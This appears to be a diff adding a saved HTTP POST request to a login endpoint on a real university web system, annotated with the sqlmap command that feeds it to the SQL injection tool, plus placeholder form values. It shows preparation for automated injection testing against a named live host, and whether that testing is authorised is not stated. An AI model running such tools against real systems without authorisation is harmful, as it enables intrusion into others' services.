@@ -1,0 +1,3 @@
+http://biis.buet.ac.bd:80/BIIS_WEB/CheckValidity.do (POST)  # .\sqlmap.py -r .\postReqs\buet
+
+userName=sdfsdfsdfsdf&passWord=1407bf519e986c00ae8809a95c38c5202c24c13c6bc003c1de5847072db93c5c
